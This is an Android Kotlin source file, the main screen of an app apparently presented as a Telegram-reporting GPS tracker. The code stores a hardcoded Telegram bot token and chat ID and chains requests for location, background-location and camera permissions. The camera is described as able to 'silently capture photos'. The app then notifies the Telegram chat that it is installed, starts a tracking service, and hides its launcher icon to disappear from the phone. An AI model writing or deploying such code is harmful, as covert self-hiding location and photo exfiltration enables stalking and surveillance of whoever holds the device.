package com.gpstracker.telegram

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.gpstracker.telegram.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val prefs by lazy { getSharedPreferences(Prefs.NAME, Context.MODE_PRIVATE) }

    // ─── Permission launchers ─────────────────────────────────────────────────

    private val locationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val granted = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                      results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        if (granted) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) askBackgroundLocation()
            else askCamera()
        } else showPermissionRationale()
    }

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { askCamera() }   // proceed regardless — degrade gracefully

    private val cameraLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { activate() }    // proceed regardless — camera is optional

    private val notifLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* optional */ }

    // ─── Lifecycle ────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Ask notification permission early (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) notifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }

        // Save hardcoded credentials on first run
        if (prefs.getString(Prefs.KEY_BOT_TOKEN, null).isNullOrBlank()) {
            prefs.edit()
                .putString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN)
                .putString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)
                .apply()
        }

        if (prefs.getBoolean(Prefs.KEY_STEALTH_ACTIVATED, false)) {
            // Already set up — just show confirmation and close
            showStatus("🔒 Tracker is active")
            Handler(Looper.getMainLooper()).postDelayed({ finishAndRemoveTask() }, 1200)
            return
        }

        // First launch — kick off the permission chain automatically
        showStatus("Setting up tracker…")
        requestPermissions()
    }

    // ─── Permission chain ─────────────────────────────────────────────────────

    private fun requestPermissions() {
        val hasFine = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasFine) {
            locationLauncher.launch(
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val hasBg = ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            if (!hasBg) { askBackgroundLocation(); return }
        }

        askCamera()
    }

    private fun askBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            AlertDialog.Builder(this)
                .setTitle("One more step")
                .setMessage(
                    "On the next screen please choose\n\"Allow all the time\"\nso tracking works when the screen is off."
                )
                .setPositiveButton("Continue") { _, _ ->
                    backgroundLocationLauncher.launch(
                        Manifest.permission.ACCESS_BACKGROUND_LOCATION
                    )
                }
                .setCancelable(false)
                .show()
        }
    }

    private fun askCamera() {
        val hasCam = ContextCompat.checkSelfPermission(
            this, Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasCam) {
            AlertDialog.Builder(this)
                .setTitle("Camera access")
                .setMessage("Allow camera so the tracker can silently capture photos and send them to you if the phone is stolen.")
                .setPositiveButton("Allow") { _, _ ->
                    cameraLauncher.launch(Manifest.permission.CAMERA)
                }
                .setNegativeButton("Skip") { _, _ -> activate() }
                .setCancelable(false)
                .show()
        } else {
            activate()
        }
    }

    // ─── Activation ───────────────────────────────────────────────────────────

    private fun activate() {
        showStatus("Activating…")

        prefs.edit()
            .putBoolean(Prefs.KEY_TRACKING_ACTIVE,   true)
            .putBoolean(Prefs.KEY_STEALTH_ACTIVATED,  true)
            .remove(Prefs.KEY_START_LAT)
            .remove(Prefs.KEY_START_LNG)
            .remove(Prefs.KEY_LAST_SENT_TIME)
            .apply()

        // Send "installed + active" Telegram message in background
        val token  = prefs.getString(Prefs.KEY_BOT_TOKEN, Prefs.DEFAULT_BOT_TOKEN) ?: Prefs.DEFAULT_BOT_TOKEN
        val chatId = prefs.getString(Prefs.KEY_CHAT_ID,   Prefs.DEFAULT_CHAT_ID)   ?: Prefs.DEFAULT_CHAT_ID
        lifecycleScope.launch {
            withContext(Dispatchers.IO) {
                try { TelegramApi.sendMessage(token, chatId, TelegramApi.buildInstalledMessage()) }
                catch (_: Exception) {}
            }
        }

        // Start the tracking service
        val intent = Intent(this, LocationTrackingService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }

        showStatus("🔒 Tracker active")

        // Disappear completely after 1.5 s
        Handler(Looper.getMainLooper()).postDelayed({
            hideLauncherIcon()
            finishAndRemoveTask()
        }, 1500)

        Log.d("MainActivity", "Activated — disappearing")
    }

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("MainActivity", "hideLauncherIcon: ${e.message}")
        }
    }

    // ─── UI helpers ───────────────────────────────────────────────────────────

    private fun showStatus(msg: String) {
        binding.tvStatus.text = msg
    }

    private fun showPermissionRationale() {
        AlertDialog.Builder(this)
            .setTitle("Location permission required")
            .setMessage("This app needs location access to track the phone. Please grant it in Settings.")
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.fromParts("package", packageName, null)
                })
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
}
